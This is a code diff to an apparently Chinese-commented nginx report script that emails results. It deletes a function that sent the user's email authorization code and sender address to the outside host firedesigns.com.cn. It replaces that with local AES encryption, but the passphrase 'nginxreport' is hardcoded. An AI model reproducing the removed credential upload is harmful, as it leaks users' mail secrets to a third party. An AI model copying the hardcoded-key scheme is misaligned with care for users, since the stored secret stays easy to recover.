@@ -21,6 +21,12 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.utils import parseaddr, formataddr
 
+# 加密
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import scrypt
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
+
 # 指定字体路径（更换为你的字体文件路径）
 font_path = "./simkai.ttf"
 # 加载字体
@@ -1191,6 +1197,21 @@ def calculate_module_metrics(log_dict):
 
     return module_metrics
 
+def generate_key(password: str, salt: bytes) -> bytes:
+    # 使用scrypt生成密钥，scrypt是基于密码的密钥派生函数（PBKDF2的一种变体）
+    return scrypt(password.encode(), salt=salt, key_len=32, N=2 ** 14, r=8, p=1)
+
+def decrypt_from_file(password: str, filename: str) -> str:
+    with open(filename, 'rb') as f:
+        salt = f.read(16)  # 读取盐值
+        iv = f.read(16)  # 读取初始化向量
+        ct = f.read()  # 读取密文
+
+    key = generate_key(password, salt)  # 生成密钥
+    cipher = AES.new(key, AES.MODE_CBC, iv)  # 使用相同的密钥和IV初始化解密器
+    decrypted_data = unpad(cipher.decrypt(ct), AES.block_size).decode()  # 解密并去掉填充
+    return decrypted_data
+
 def send_mail(message, title):
     """
        邮件通知
@@ -1206,7 +1227,7 @@ def send_mail(message, title):
         return ','.join(addr_list)
 
     from_addr = config["sender"]
-    password = py3_get_pwd(from_addr, "pwd")
+    password = decrypt_from_file(ng_password, filename)
     smtp_server = config["smtp_server"]
     msg = MIMEMultipart()
     msg.attach(MIMEText(message, 'html', 'utf-8'))
@@ -1287,26 +1308,28 @@ def get_nginx_files(base_dir):
                     nginx_files.append(filepath)
     return nginx_files
 
+def encrypt_and_save(password: str, data: str, filename: str):
+    salt = get_random_bytes(16)  # 用于密钥派生的盐值
+    key = generate_key(password, salt)  # 生成密钥
+    cipher = AES.new(key, AES.MODE_CBC)  # 创建AES加密对象
+    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))  # 加密数据
+    with open(filename, 'wb') as f:
+        f.write(salt)  # 保存盐值到文件
+        f.write(cipher.iv)  # 保存初始化向量（IV）
+        f.write(ct_bytes)  # 保存密文
+
 def set_password():
-    def post_data(ip, date, jsondata):
-        url = "https://firedesigns.com.cn/pwd/insert"
-        data = {"ip": ip, "date": date, "jsondata": jsondata}
-        data = json.dumps(data)
-        headers = {'Content-Type': 'application/json'}
-        response = requests.post(url, data=data, headers=headers)
-        return response
     sensitive_data = sys.argv[1].strip()
-    data = {"username": config["sender"], "pwd": sensitive_data}
-    response = post_data(config["sender"], "pwd", json.dumps(data))
-    if response.json()['status'] == 'inserted':
-        print("\033[32m邮箱授权码设置成功!\033[0m")
-    else:
-        print("\033[31m邮箱授权码设置失败!\033[0m")
+    # 加密并保存
+    encrypt_and_save(ng_password, sensitive_data, filename)
+    print("\033[32m邮箱授权码设置成功!\033[0m")
 
 # 执行主程序
 if __name__ == "__main__":
     import sys
     config = load_config()
+    ng_password = "nginxreport"
+    filename = "./encrypted_data.bin"  # 密文存储文件
     if len(sys.argv) == 2:
         set_password()
     elif len(sys.argv) == 1:
